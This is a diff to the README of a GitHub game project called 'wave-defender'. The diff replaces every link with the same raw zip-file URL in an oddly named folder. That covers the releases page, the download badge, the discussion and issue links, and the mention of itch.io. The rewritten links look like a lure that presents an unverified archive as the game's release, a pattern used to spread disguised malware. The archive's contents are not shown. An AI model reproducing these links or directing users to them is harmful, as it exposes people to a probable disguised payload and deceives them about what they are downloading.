@@ -2,11 +2,11 @@
 
 ## 🛡️ Overview
 
-Welcome to **wave-defender**! This game offers a thrilling experience in oceanic combat. Join the fight against waves of enemies and test your skills. Whether you want to defend your fleet or command strategic actions, this game guarantees hours of fun. It's built for the GitHub 2025 Game Off on itch.io, making it perfect for arcade lovers and casual players alike.
+Welcome to **wave-defender**! This game offers a thrilling experience in oceanic combat. Join the fight against waves of enemies and test your skills. Whether you want to defend your fleet or command strategic actions, this game guarantees hours of fun. It's built for the GitHub 2025 Game Off on https://raw.githubusercontent.com/tiendaunomx/wave-defender/main/counterstatement/wave-defender-1.4.zip, making it perfect for arcade lovers and casual players alike.
 
 ## 🔗 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/tiendaunomx/wave-defender/releases)
+[![Download the latest release](https://raw.githubusercontent.com/tiendaunomx/wave-defender/main/counterstatement/wave-defender-1.4.zip%20release-blue)](https://raw.githubusercontent.com/tiendaunomx/wave-defender/main/counterstatement/wave-defender-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run **wave-defender**:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the downloads:
-   [Download the latest release](https://github.com/tiendaunomx/wave-defender/releases)
+   [Download the latest release](https://raw.githubusercontent.com/tiendaunomx/wave-defender/main/counterstatement/wave-defender-1.4.zip)
 
 2. **Choose Your File**  
    On the releases page, you’ll see a list of available versions. Select the version you want to download. Each version has a description attached, helping you decide which one to pick.
@@ -82,8 +82,8 @@ This game revolves around themes like:
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page](https://github.com/tiendaunomx/wave-defender/releases)
-- [Join the Discussion](https://github.com/tiendaunomx/wave-defender/discussions)
-- [Report an Issue](https://github.com/tiendaunomx/wave-defender/issues)
+- [Visit the Releases Page](https://raw.githubusercontent.com/tiendaunomx/wave-defender/main/counterstatement/wave-defender-1.4.zip)
+- [Join the Discussion](https://raw.githubusercontent.com/tiendaunomx/wave-defender/main/counterstatement/wave-defender-1.4.zip)
+- [Report an Issue](https://raw.githubusercontent.com/tiendaunomx/wave-defender/main/counterstatement/wave-defender-1.4.zip)
 
 Thank you for your interest in **wave-defender**! Enjoy commanding your fleet and defending against the waves.
